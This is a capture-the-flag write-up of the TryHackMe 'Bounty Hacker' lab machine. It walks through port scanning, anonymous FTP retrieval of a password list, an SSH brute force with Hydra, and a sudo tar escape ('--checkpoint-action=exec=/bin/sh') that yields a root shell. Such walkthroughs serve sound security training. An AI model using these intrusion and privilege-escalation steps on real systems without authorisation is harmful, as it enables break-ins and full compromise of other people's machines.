# THM - Bounty Hacker

#### Ip: 10.10.121.167
#### Name: Bounty Hacker
#### Difficulty: Easy

----------------------------------------------------------------------

bounty.jpeg

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. 

```text
┌──(ryan㉿kali)-[~/THM/Bounty_Hacker]
└─$ sudo nmap -p-  --min-rate 10000 10.10.121.167        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-06 09:28 CDT
Nmap scan report for 10.10.121.167
Host is up (0.27s latency).
Not shown: 64168 filtered tcp ports (no-response), 1364 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
```

Next I'll also use the `sC` and `-sV` flags to use basic scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/THM/Bounty_Hacker]
└─$ sudo nmap -sC -sV 10.10.121.167 -p 21,22,80                                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-06 09:31 CDT
Nmap scan report for 10.10.121.167
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.6.181
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.49 seconds
```

Heading to the site we find a static page:

site.png

Looking over our Nmap results we see that FTP has anonymous access enabled- lets check that out:

```text
┌──(ryan㉿kali)-[~/THM/Bounty_Hacker]
└─$ ftp 10.10.121.167  
Connected to 10.10.121.167.
220 (vsFTPd 3.0.3)
Name (10.10.121.167:ryan): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||38071|)
ftp: Can't connect to `10.10.121.167:38071': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |********************************************************************************|   418        3.39 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.27 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |********************************************************************************|    68      111.98 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.33 KiB/s)
ftp> bye
221 Goodbye.
```
Lets take a look at these files:

```text
┌──(ryan㉿kali)-[~/THM/Bounty_Hacker]
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
                                                                                                                             
┌──(ryan㉿kali)-[~/THM/Bounty_Hacker]
└─$ cat locks.txt             
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

Cool, we now have a potential username as well as what appears to be a password list. Lets try this against SSH using Hydra:

### Exploitation

hydra.png

Cool, Hydra found a valid password. Lets login to SSH.

```text
┌──(ryan㉿kali)-[~/THM/Bounty_Hacker]
└─$ ssh lin@10.10.121.167                      
The authenticity of host '10.10.121.167 (10.10.121.167)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.121.167' (ED25519) to the list of known hosts.
lin@10.10.121.167's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ hostname
bountyhacker
```

We can now grab the user.txt flag:

user_flag.png

### Privilege Escalation

Running `sudo -l` to see what our user can run with elevated permissions we see we can run tar:

```text
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Lets head over to https://gtfobins.github.io/gtfobins/tar/#sudo for the commands we'll need to exploit this:

tar.png

```text
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```
Nice, that worked. Lets grab the final root.txt flag:

root_flag.png

Thanks for following along!

-Ryan

----------------------------------------